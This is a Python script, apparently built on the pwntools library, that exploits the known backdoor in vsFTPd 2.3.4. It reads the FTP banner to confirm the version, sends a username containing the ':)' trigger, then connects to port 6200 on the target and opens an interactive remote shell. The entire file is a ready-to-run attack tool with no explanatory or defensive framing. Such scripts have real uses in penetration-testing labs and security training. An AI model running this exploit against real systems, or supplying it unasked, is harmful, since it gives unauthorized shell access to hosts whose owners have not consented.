from argparse import ArgumentParser, Namespace
from time import sleep
from sys import exit
from pwn import remote, log


def init_args() -> Namespace:
    """Initializes arguments for exploit"""
    parser = ArgumentParser(description="vsFTPd 2.3.4 Backdoor Exploit")
    parser.add_argument("-i", "--ip", help='Target IP')
    parser.add_argument("-p", "--port", help='Target Port')

    args = parser.parse_args()

    return args


def check_version() -> bool:
    """Checks for suitable version"""
    LOG.status("Checking version")
    io = remote(IP, PORT)
    io.recvuntil(b"vsFTPd ")

    version = (io.recvuntil(b")")[:-1]).decode()

    if version != "2.3.4":
        LOG.failure("Unsuitable version!")
        exit()
    else:
        LOG.success("Suitable version!")

    io.close()

    return True


def start_backdoor() -> None:
    """Starts backdoor with 'magic' characters"""
    io = remote(IP, PORT)

    LOG.status("Trying to start the backdoor")

    io.sendline(b"USER hello:)")
    io.sendline(b"PASS bye")

    connect_to_backdoor()

    io.close()


def connect_to_backdoor() -> None:
    """Connects to 6200 port that was opened by backdoor"""
    LOG.status("Trying to connect to the backdoor")
    sleep(2)
    io = remote(IP, 6200)
    LOG.success("pwned!")
    io.interactive()


def main() -> None:
    """Starts exploit"""
    if check_version():
        start_backdoor()


if __name__ == "__main__":
    args = init_args()

    IP = args.ip
    PORT = args.port
    LOG = log.progress('')

    main()
